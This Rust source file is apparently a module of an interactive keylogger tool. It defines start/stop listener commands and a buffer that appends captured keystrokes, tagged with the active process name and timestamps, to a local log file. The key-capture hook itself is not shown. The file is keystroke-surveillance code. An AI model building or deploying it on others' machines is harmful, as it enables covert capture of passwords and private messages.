use clap::{Subcommand, Parser};
use std::sync::Mutex;
use std::fs::OpenOptions;
use std::io::Write;
use once_cell::sync::Lazy;
use chrono::prelude::DateTime;
use chrono::Utc;
use crate::process_identification::{LAST_PROCESS_NAME};
use crate::formatting::update_status_header;

#[derive(Parser, Debug)]
#[command(name = "")]
pub struct KeyloggerCommands {
    #[command(subcommand)]
    pub command: Commands,
}

#[derive(Subcommand, Debug)]
pub enum Commands {
    /// Starts key listener
    StartKeyListener,
    /// Stops key listener
    StopKeyListener,
    /// Reveals keylogger logs
    ShowLogs {
        #[arg[short = 'v', long = "verbose"]]
        verbose: bool
    },
    /// Quit Program
    QuitProgram,
}

/// Manages buffered keyboard input logging with a configurable buffer size
pub struct KeyBuffer {
    buffer: Vec<u16>,
    max_size: usize,
    log_file_path: String,
}

impl KeyBuffer {
    /// Creates a new KeyBuffer with default settings
    pub fn new() -> Self {
        Self::with_capacity(8, "keylog.txt")
    }
    
    /// Creates a KeyBuffer with custom capacity and file path
    pub fn with_capacity(max_size: usize, log_file_path: &str) -> Self {
        Self {
            buffer: Vec::with_capacity(max_size),
            max_size,
            log_file_path: log_file_path.to_string(),
        }
    }
    
    /// Adds characters to the buffer, flushing to disk when full
    pub fn push_chars(&mut self, chars: &[u16]) -> Result<(), std::io::Error> {
        // If adding these chars exceeds capacity, flush first
        if self.len() + chars.len() >= self.max_size {
            self.flush_to_disk(None, None)?;
        }
        
        self.buffer.extend_from_slice(chars);

        Ok(())
    }
    
    /// Forces a flush of the current buffer to the disk
    pub fn flush_to_disk(&mut self, current_name: Option<&str>, process_changed: Option<bool>) -> Result<(), std::io::Error> {
        if self.is_empty() {
            return Ok(());
        }
        
        let content = String::from_utf16(&self.buffer)
            .map_err(|_| std::io::Error::new(
                std::io::ErrorKind::InvalidData, 
                "Invalid UTF-16 sequence"
            ))?;
            
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.log_file_path)?;


        let process_name = match LAST_PROCESS_NAME.try_lock() {
            Ok(guard) => guard.as_ref().cloned().unwrap_or_else(|| "Unknown Process".to_string()),
            Err(_) => "Unknown Process (lock unavailable)".to_string(),
        };

        if process_changed.unwrap_or(false) {
            // Add timestamp and process name to the log
            let now: DateTime<Utc> = Utc::now();
            let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
            let header = format!("\n\n{} - {} - {}\n", process_name, timestamp, "=".repeat(50));
            // Write the header to the file
            file.write_all(header.as_bytes())?;
        }
        // Write the buffer content to the file
        file.write_all(content.as_bytes())?;
            
        if let Some(current_name) = current_name {
            let now: DateTime<Utc> = Utc::now();
            let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
            let header = format!("\n\n{} - {} - {}\n", current_name, timestamp, "-".repeat(50));
            file.write_all(header.as_bytes())?;
        }

        file.flush()?;

        self.buffer.clear();
        update_status_header("💾 Saved Buffer").unwrap();
        Ok(())
    }
    
    /// Returns the current buffer size
    pub fn len(&self) -> usize {
        self.buffer.len()
    }
    
    /// Checks if the buffer is empty
    pub fn is_empty(&self) -> bool {
        self.buffer.is_empty()
    }
}

// Thread-safe global instance
pub static GLOBAL_KEY_BUFFER: Lazy<Mutex<KeyBuffer>> = Lazy::new(|| {
    Mutex::new(KeyBuffer::new())
});